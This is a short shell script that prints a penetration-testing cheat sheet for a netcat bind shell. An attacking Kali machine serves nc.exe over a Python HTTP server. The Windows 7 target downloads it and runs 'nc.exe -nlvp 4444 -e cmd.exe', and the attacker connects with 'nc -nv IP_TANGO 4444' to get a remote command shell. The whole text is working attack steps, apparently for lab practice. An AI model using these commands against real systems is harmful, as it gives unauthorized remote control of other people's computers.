echo '
--] BIND SHELL

OPERATOR == KALI
TANGO    == WINDOWS 7

OPERTOR    ==> TASK ==> cd /usr/share/windows-binaries
OPERTOR    ==> TASK ==> python -m SimpleHTTPServer 80
TANGO      ==> TASK ==> open iexplorer at http://IP_OPERATOR/
TANGO      ==> TASK ==> take nc.exe
TANGO      ==> TASK ==> cmd.exe
TANGO      ==> TASK ==> cd Download
TANGO      ==> TASK ==> explorer .
TANGO      ==> TASK ==> nc.exe -nlvp 4444 -e cmd.exe
OPERATOR   ==> TASK ==> nc -nv IP_TANGO 4444

'
read